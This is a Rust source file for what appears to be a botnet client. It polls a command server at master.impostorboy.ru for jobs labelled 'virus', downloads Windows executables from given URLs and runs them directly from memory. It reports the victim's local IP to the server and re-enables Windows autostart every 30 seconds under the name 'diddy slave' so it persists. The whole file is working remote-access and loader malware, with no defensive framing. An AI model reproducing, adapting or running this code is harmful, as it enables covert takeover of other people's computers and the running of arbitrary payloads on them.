use anyhow::{Context, Result};
use auto_launch::{AutoLaunch, AutoLaunchBuilder, WindowsEnableMode};
use maple_rs::Maple;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tokio::time::{Duration, MissedTickBehavior, interval};

const MASTER: &str = "https://master.impostorboy.ru";
const POLL_INTERVAL: Duration = Duration::from_secs(60);
const RETRY_DELAY: Duration = Duration::from_secs(5);
const AUTOSTART_INTERVAL: Duration = Duration::from_secs(30);

#[derive(Clone, Deserialize)]
struct Virus {
    id: u64,
    url: String,
    status: String,
}

#[derive(Serialize)]
struct VirusResult {
    id: u64,
    status: String,
    out: Vec<u8>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let client = reqwest::Client::new();
    tokio::spawn(autostart_watchdog());

    let mut tick = interval(POLL_INTERVAL);
    tick.set_missed_tick_behavior(MissedTickBehavior::Delay);

    loop {
        tick.tick().await;
        poll_with_retries(&client).await;
    }
}

async fn poll_with_retries(client: &reqwest::Client) {
    let mut delay = RETRY_DELAY;

    while let Err(err) = poll(client).await {
        eprintln!("poll сломался ({err:#}); рестартую через {delay:?}");
        tokio::time::sleep(delay).await;
        delay = (delay * 2).min(POLL_INTERVAL);
    }
}

async fn poll(client: &reqwest::Client) -> Result<()> {
    let que: Vec<Virus> = client
        .get(format!("{MASTER}/poll"))
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;

    if let Some(virus) = que
        .iter()
        .filter(|virus| virus.status == "created")
        .min_by_key(|virus| virus.id)
        .cloned()
    {
        tokio::spawn(run_virus(client.clone(), virus));
    }

    Ok(())
}

async fn run_virus(client: reqwest::Client, virus: Virus) {
    if let Err(err) = run_virus_inner(client, &virus).await {
        eprintln!("virus {} сломался: {err}", virus.id);
    }
}

async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
    send_accepted(&client, virus.id).await?;

    let virus_bytes = client
        .get(&virus.url)
        .send()
        .await?
        .error_for_status()?
        .bytes()
        .await?;

    {
        let module = Maple::load_executable_from_memory(&virus_bytes)
            .context("Не удалось загрузить PE-файл из памяти")?;

        module
            .execute_entry_point()
            .context("Не удалось выполнить точку входа PE-файл")?;
    }

    seek_self_in_pro(&client, virus.id).await?;

    Ok(())
}

async fn send_accepted(client: &reqwest::Client, id: u64) -> Result<()> {
    client
        .post(format!("{MASTER}/virus_status"))
        .json(&VirusResult {
            id,
            status: "accepted".to_owned(),
            out: local_ip().into_bytes(),
        })
        .send()
        .await?
        .error_for_status()?;
    Ok(())
}

async fn seek_self_in_pro(client: &reqwest::Client, id: u64) -> Result<()> {
    let me = local_ip();

    let pro: HashMap<String, u64> = client
        .get(format!("{MASTER}/pro"))
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;

    if let Some(id) = pro.get(&me) {
        println!("мы в pro: {me} -> virus {id}");
        return Ok(());
    }

    eprintln!("в pro нас нет — перепосылаю accepted");
    send_accepted(client, id).await?;

    let pro: HashMap<String, u64> = client
        .get(format!("{MASTER}/pro"))
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;

    match pro.get(&me) {
        Some(id) => println!("мы в pro: {me} -> virus {id}"),
        None => anyhow::bail!("после повторного accepted нас всё ещё нет в pro"),
    }

    Ok(())
}

async fn autostart_watchdog() {
    let mut tick = interval(AUTOSTART_INTERVAL);
    tick.set_missed_tick_behavior(MissedTickBehavior::Delay);

    loop {
        tick.tick().await;

        let al = match check_autostart() {
            Ok(al) => al,
            Err(err) => {
                eprintln!("autostart не собрался: {err:#}");
                continue;
            }
        };

        match tokio::task::spawn_blocking(move || -> Result<()> {
            al.disable()?;
            al.enable()?;
            Ok(())
        })
        .await
        {
            Ok(Ok(())) => {}
            Ok(Err(err)) => eprintln!("autostart сломался: {err:#}"),
            Err(err) => eprintln!("autostart-таск сломался: {err}"),
        }
    }
}

fn check_autostart() -> Result<AutoLaunch> {
    let app_path = std::env::current_exe().context("не нашёл свой собственный exe")?;
    AutoLaunchBuilder::new()
        .set_app_name("diddy slave")
        .set_app_path(&app_path.to_string_lossy())
        .set_windows_enable_mode(WindowsEnableMode::CurrentUser)
        .build()
        .context("не собрал auto-launch")
}

fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|sock| sock.connect("8.8.8.8:80").map(|_| sock))
        .and_then(|sock| sock.local_addr())
        .map(|addr| addr.ip().to_string())
        .unwrap_or_else(|_| "unknown".to_owned())
}
